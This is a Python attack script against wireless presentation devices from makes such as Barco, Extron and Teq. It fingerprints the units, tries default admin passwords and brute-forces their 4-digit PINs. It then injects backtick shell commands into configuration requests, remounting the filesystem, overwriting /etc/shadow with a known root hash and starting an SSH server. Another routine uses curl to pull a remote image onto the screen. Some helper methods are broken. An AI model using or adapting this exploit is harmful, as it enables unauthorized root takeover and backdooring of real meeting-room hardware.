#!/usr/bin/env python
import requests
import warnings
warnings.filterwarnings("ignore")
import sys
import re
import os
import socket
ADMIN_USERNAME="admin"
ADMIN_PASSWORD="admin"
MODERATOR_USERNAME="moderator"
MODERATOR_PASSWORD="moderator"
REMOTE_USERNAME="browserslide"
PROXIES=dict()

class Target:

    def __init__(self, ip):
        self.__ip = ip
        self.__name = ""
        self.__model = ""
        self.__make = ""
        self.__version = 0
        self.__session_token = None

    def fingerprint(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((self.__ip, 389))
            s.send("wppaliveROCK")
            response = s.recv(2048)
            if response != "wppaliveROLL":
                raise Exception("An error occured during discovery")
            s.send("\x77\x70\x70\x63\x6d\x64\x00\x00\x90")
            s.settimeout(3.0)
            payload = s.recv(2048)
            idx = 25
            curr_idx = 25
            while payload[curr_idx] != "\x00":
                curr_idx += 1
            self.__name = payload[idx:curr_idx]

            # skip garbage
            while payload[curr_idx] == "\x00":
                curr_idx += 1
            idx = curr_idx

            while payload[curr_idx] != "\x00":
                curr_idx += 1
            make = payload[idx:curr_idx]
            skip = False
            if make == "awind":
                curr_idx += 2
                skip = True
            elif make == "Extron":
                curr_idx += 1
                skip = True
            elif make == "Teq":
                curr_idx += 4
                skip = True
            elif make == "barco":
                curr_idx += 2
                skip = True
            elif "wga" in make:
                curr_idx += 1
                skip = True

            if skip:
                while payload[curr_idx] != "\x00":
                    curr_idx += 1
            self.__make = payload[idx:curr_idx]

            # skip garbage
            while payload[curr_idx] == "\x00":
                curr_idx += 1
            curr_idx += 10
            while payload[curr_idx] == "\x00":
                curr_idx += 1
            idx = curr_idx

            while payload[curr_idx] != "\x00":
                curr_idx += 1
            self.__model = payload[idx:curr_idx]

            # skip garbage
            idx += 16
            version = payload[idx:idx+4]

            self.__version = ".".join([str(int(x)) for x in\
                re.findall(r"([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2})",\
                version.encode('hex'))[0]]
            )

            print "[+] Target discovered at %s (%s)" % (self.__ip, self.__name)
            s.close()
            return self.__name
        except socket.timeout as e:
            return "unknown"

    def get_manufacturer(self):
        try:
            response = requests.get("http://%s/cgi-bin/web_index.cgi?lang=en&src=AwWelcome.html" % self.__ip, timeout=5, verify=False, proxies=PROXIES)
            if response.status_code == 200:
                title = re.findall(r"<title>([^<]*)</title>", response.content)
                if len(title):
                    return title[0]
            return "unknown"
        except Exception as e:
            return "unknown"

    def is_remote_view_pin_protected(self):
        try:
            response = requests.get("https://%s/cgi-bin/web_index.cgi" \
                    "?lang=en&src=AwLoginBS.html" % self.__ip, verify=False, timeout=2, proxies=PROXIES)
            if response.status_code == 200:
                status = re.findall(r"switch\( \"([^\"]*)", response.content)
                if len(status) and status[0] == "strAlertPasswordSuccess":
                   return 0
            return 1
        except Exception as e:
            return 0

    def login_remoteview(self, user="browserslide", bscode="1124"):
        response = requests.post(
            "http://%s/cgi-bin/login.cgi?lang=en&src=AwLoginBS.html&varSEID" \
                    % self.__ip,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data="user=%s&bscode=%s" % (user, bscode),
            proxies=PROXIES
        )
        if response.status_code == 200:
            status = re.findall(r"switch\( \"([^\"]*)", response.content)[0]
            if status == "strAlertPasswordSuccess":
               session_token = re.findall(r"&([A-z0-9]{16})'", response.content)
               return session_token[0] if len(session_token) else None
            else:
                return None
        else:
            return None

    def login_webadmin(self, username="admin", password="admin"):
        try:
            data = (
                ("login", username),
                ("account", username),
                ("password", password)
            )
            response = requests.post(
                "https://%s/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"% \
                        self.__ip,
                data=data,
                verify=False,
                timeout=2,
                proxies=PROXIES
            )
            if response.status_code == 200:
                session_token = re.findall(r"""&([A-z0-9]{16})['"]""", response.content)
                if len(session_token):
                    self.__session_token = session_token[0]
                return self.__session_token
            else:
                return None
        except Exception as e:
            return None

    def login_webadmin_teqavit(self, username="admin", password="Admin&11"):
        try:
            data = (
                ("user", username),
                ("admin", password),
            )
            response = requests.post(
                "http://%s/cgi-bin/login_admin.cgi?lang=en"% \
                        self.__ip,
                data=data,
                verify=False,
                timeout=2,
                proxies=PROXIES
            )
            if response.status_code == 200:
                session_token = re.findall(r"""&([A-z0-9]{16})['"]""", response.content)
                if len(session_token):
                    self.__session_token = session_token[0]
                return self.__session_token
            else:
                return None
        except Exception as e:
            return None

    def bruteforce_http():
        for i in range(0,10000):
            if self.login(bscode=str(i).zfill(4)) is not None:
                print "\n[*] PIN code is %s" % (str(i).zfill(4))
                break
            sys.stdout.write('\r')
            sys.stdout.write('[+] PIN checked: %d/%d' % (i, 10000))
            sys.stdout.flush()
        pin = str(i).zfill(4)

    def bruteforce_proto():
        print "[+] Establishing connection to %s" % target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, 389))
            # Discovery
            s.send("wppaliveROCK")
            response = s.recv(2048)
            if response != "wppaliveROLL":
                raise Exception("An error occured during discovery")
            s.send("\x77\x70\x70\x63\x6d\x64\x00\x00\x90")
            response = s.recv(2048)
            print "[+] Connection established with %s (%s)" % (target, response[25:40])
            s.send("wppaliveROCK")
            response = s.recv(2048)
            if response != "wppaliveROLL":
                raise Exception("An error occured during association")
            print "[+] Starting PIN bruteforcing ..."

            # Authentication
            payload = "\x77\x70\x70\x63\x6d\x64\x00\x00\x92\x47\x72\x65\x6d\x77\x65\x6c" \
                "\x6c\x27\x73\x20\x69\x50\x61\x64\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xa8\x0c\xe4%s" \
            "\x00\x00\x00\x00\x1e\x0a\x0a\x00\x01\x00\x00\x02\x4a\x6e\x4d" \
            "\x4f\x50\x53\x44\x4b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00"

            for i in range(0,10000):
                pin = str(i).zfill(4)
                s.send(payload % pin)
                response = s.recv(2048)
                if response.encode('hex')[-4:] == "9301":
                    print "\n[*] PIN code is %s" % pin
                    break
                sys.stdout.write('\r')
                sys.stdout.write('[+] PIN checked: %d/%d' % (i, 10000))
                sys.stdout.flush()

        except Exception as e:
            print "[!] %s" % e.message
            s.close()

    def inject_http(self, payload):
        command = "<Send><seid>%s</seid><upload><protocol>http</protocol>" \
            "<address>`%s`</address><logo>test</logo></upload></Send>"

        command2 = "<Send><seid>%s</seid><upload><protocol>ftp</protocol>" \
            "<address>ftp://192.168.100.1</address><port>21</port>" \
            "<account>`%s`</account><password>p</password>" \
            "<logo>192.168.100.1</logo></upload></Send>"

        command3 = "<Send><seid>%s</seid><name>USBHID_ONOFF</name>" \
                            "<value>`%s`</value></Send>"
        data = {
            "command": command2 % (self.__session_token, payload)
        }
        response = requests.post(
            "https://%s/cgi-bin/return.cgi" % self.__ip,
            data=data,
            verify=False
        )
        print(response.status_code)
        print(response.content)

    def inject_http_teqavit(self, payload):
        command = "<Send><seid>%s</seid><upload><protocol>http</protocol>" \
            "<address>`%s`</address><logo>test</logo></upload></Send>"

        command2 = "<Send><seid>%s</seid><upload><protocol>ftp</protocol>" \
            "<address>ftp://192.168.100.1</address><port>21</port>" \
            "<account>`%s`</account><password>p</password>" \
            "<logo>192.168.100.1</logo></upload></Send>"

        command3 = "<Send><seid>%s</seid><name>USBHID_ONOFF</name>" \
                            "<value>`%s`</value></Send>"
        data = {
            "command": command2 % (self.__session_token, payload)
        }
        response = requests.post(
            "http://%s/cgi-bin/return_test.cgi" % self.__ip,
            data=data,
            verify=False
        )

    def rce_http(self):
        payloads = [
            "mount -o remount,rw /",
            "echo 'root:$6$0fkukdLY$35sIH00UcgmsyWtIPtkjSEdbMcpaGKoX7gRT2XtM1Sxij9SgfoV/Om6kiSGU9evxY56yHaA0wsbvfHsjEcBKO0:0:0:99999:7:::' > /etc/shadow",
            "dropbear"
        ]
        for payload in payloads:
            self.inject_http(payload)

    def rce_http_teqavit(self):
        payloads = [
            "mount -o remount,rw /",
            "echo 'root:$6$0fkukdLY$35sIH00UcgmsyWtIPtkjSEdbMcpaGKoX7gRT2XtM1Sxij9SgfoV/Om6kiSGU9evxY56yHaA0wsbvfHsjEcBKO0:0:0:99999:7:::' > /etc/shadow",
            "dropbear"
        ]
        for payload in payloads:
            self.inject_http_teqavit(payload)


    def rick_and_morty(self):
        payloads = [
            'mount -o remount,rw /',
            'curl "http://thefader-res.cloudinary.com/images/w_1440,c_limit,f_auto,q_auto:best/46223_ekgqhv/rick-and-morty-dan-harmon-justin-roiland-season-3.jpg" -o /tmp/rick.jpg',
            '/mnt/StartJpegPicture /tmp/rick.jpg'
        ]
        for payload in payloads:
            self.inject_http(payload)

    @property
    def name(self):
        return self.__name

    @property
    def model(self):
        return self.__model

    @property
    def make(self):
        return self.__make

    @property
    def version(self):
        return self.__version
